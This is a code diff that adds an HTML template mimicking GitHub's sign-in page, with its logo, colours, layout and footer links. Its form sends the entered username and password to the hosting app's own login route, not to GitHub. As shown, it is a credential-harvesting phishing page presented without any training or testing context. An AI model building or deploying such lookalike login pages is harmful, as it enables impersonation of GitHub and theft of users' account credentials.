@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+            background-color: #f4f5f7;
+            color: #172b4d;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 16px;
+        }
+
+        .github-body {
+            width: 100%;
+            max-width: 340px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .github-logo {
+            color: #24292f;
+            margin-bottom: 24px;
+        }
+
+        .github-title {
+            font-size: 24px;
+            font-weight: 300;
+            color: #1F2328;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+
+        .github-card {
+            background-color: #ffffff;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 20px;
+            width: 100%;
+            box-shadow: 0 1px 3px rgba(31,35,40,0.12);
+        }
+
+        .github-form-group {
+            margin-bottom: 16px;
+        }
+
+        .github-label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .github-label {
+            font-size: 14px;
+            font-weight: 400;
+            color: #1F2328;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .github-input {
+            width: 100%;
+            padding: 5px 12px;
+            font-size: 14px;
+            line-height: 20px;
+            color: #1F2328;
+            background-color: #ffffff;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            outline: none;
+            box-shadow: inset 0 1px 2px rgba(31,35,40,0.075);
+        }
+
+        .github-input:focus {
+            border-color: #0969da;
+            box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
+        }
+
+        .github-btn {
+            width: 100%;
+            background-color: #1f883d;
+            color: #ffffff;
+            border: 1px solid rgba(31,35,40,0.15);
+            border-radius: 6px;
+            padding: 6px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 20px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .github-btn:hover {
+            background-color: #1a7f37;
+        }
+
+        .github-link {
+            color: #0969da;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .github-link:hover {
+            text-decoration: underline;
+        }
+
+        .github-signup-box {
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 16px 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            background-color: #ffffff;
+            margin-top: 16px;
+            color: #1F2328;
+        }
+
+        .github-footer {
+            margin-top: 40px;
+            display: flex;
+            gap: 12px;
+            font-size: 12px;
+        }
+
+        .github-footer a {
+            color: #636c76;
+            text-decoration: none;
+        }
+
+        .github-footer a:hover {
+            color: #0969da;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="github-body">
+        <a href="#" class="github-logo">
+            <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" fill="currentColor">
+                <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+            </svg>
+        </a>
+        <h1 class="github-title">Sign in to GitHub</h1>
+
+        <div class="github-card">
+            <form action="{{ url_for('login') }}" method="POST">
+                <div class="github-form-group">
+                    <label class="github-label" for="gh-username">Username or email address</label>
+                    <input type="text" id="gh-username" name="username" class="github-input" required autofocus>
+                </div>
+
+                <div class="github-form-group">
+                    <div class="github-label-row">
+                        <label class="github-label" for="gh-password" style="margin:0;">Password</label>
+                        <a href="#" class="github-link">Forgot password?</a>
+                    </div>
+                    <input type="password" id="gh-password" name="password" class="github-input" required>
+                </div>
+
+                <button type="submit" class="github-btn">Sign in</button>
+            </form>
+        </div>
+
+        <div class="github-signup-box">
+            New to GitHub? <a href="#" class="github-link">Create an account</a>.
+        </div>
+
+        <footer class="github-footer">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Docs</a>
+            <a href="#">Contact GitHub Support</a>
+        </footer>
+    </div>
+
+</body>
+</html>
